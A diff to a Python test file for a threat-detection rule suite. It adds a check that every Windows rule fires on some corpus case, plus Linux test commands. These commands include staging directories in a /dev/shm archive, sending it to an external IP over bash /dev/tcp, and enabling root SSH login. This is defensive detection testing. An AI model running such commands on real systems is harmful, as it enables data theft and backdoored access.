@@ -71,7 +71,12 @@ def test_every_rule_records_what_would_falsely_trigger_it(loaded):
 # --------------------------------------------------------------------------
 
 CORPUS_FIELDS = {
+    # `Image` was missing, and its absence was invisible: a rule keyed on the
+    # child process image - `win_office_spawns_shell` is one - could not be
+    # expressed by any corpus case, so it sat unexercised with nothing able to
+    # say why. Found when the Windows coverage invariant below was added.
     "CommandLine": "CommandLine", "ParentImage": "ParentProcessName",
+    "Image": "NewProcessName",
     "ImagePath": "ImagePath", "Command": "TaskContent", "TaskName": "TaskName",
     "TargetObject": "TargetObject", "Details": "Details",
     "ServiceName": "ServiceName", "IpAddress": "IpAddress",
@@ -328,6 +333,29 @@ def test_linux_rules_also_work_on_a_plain_syslog_line(name, entry, loaded):
     assert match_all(loaded.rules, text_event_fields(line, "/var/log/auth.log")), name
 
 
+def test_every_windows_rule_is_exercised_by_the_corpus(loaded):
+    """The Linux half of this has existed for a while and the Windows half
+    did not, which is why three rules could be added and sit unfired with
+    nothing saying so.
+
+    Same reasoning either way: a rule nobody has seen match is a rule that
+    might not, and the moment to find that out is now rather than during an
+    incident. Reported as a list, because when this fails it usually fails
+    for several at once.
+    """
+    windows = {r.title for r in loaded.rules
+               if str(r.logsource.get("product", "")).lower() == "windows"}
+
+    fired = {h.title for case in _corpus()
+             for h in match_all(loaded.rules, _as_event(_message(case)))}
+
+    unexercised = sorted(windows - fired)
+    assert not unexercised, (
+        f"Windows rules no corpus case fires: {unexercised}. Add one to "
+        f"evals/corpus_attacks.jsonl."
+    )
+
+
 def test_every_linux_rule_is_exercised_by_these_cases(loaded):
     """Otherwise a rule could be added, never fire, and nothing would say so.
 
@@ -406,6 +434,14 @@ LINUX_COMMANDS_THAT_SHOULD_FIRE = [
     # The daemon itself becomes the backdoor - no new binary, no new service.
     ("sshd-permitrootlogin",
      "sh -c \"echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config\""),
+    # Collection. /dev/shm is memory rather than disk, so an archive staged
+    # there survives no reboot and leaves nothing for a later forensic image.
+    ("archive-staged-in-shm",
+     "tar -czf /dev/shm/h.tgz /home/deploy /etc/nginx"),
+    # Exfiltration over a bash builtin: nothing installed, no binary to find,
+    # and it still works on a host stripped of every network tool.
+    ("exfil-over-devtcp",
+     "bash -c 'cat /dev/shm/h.tgz > /dev/tcp/185.7.2.9/443'"),
 ]
 
 LINUX_COMMANDS_THAT_MUST_NOT = [
